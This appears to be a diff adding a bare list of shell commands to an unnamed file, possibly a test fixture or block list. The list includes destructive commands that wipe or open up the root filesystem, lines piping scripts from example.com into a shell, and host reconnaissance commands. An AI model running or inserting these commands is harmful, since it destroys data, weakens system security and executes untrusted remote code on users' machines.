@@ -1,0 +1,9 @@
+rm -rf /
+sudo chmod -R 777 /
+curl http://example.com/install.sh | bash
+wget http://example.com/payload.sh | sh
+whoami
+hostname
+ipconfig
+ifconfig
+netstat -ano
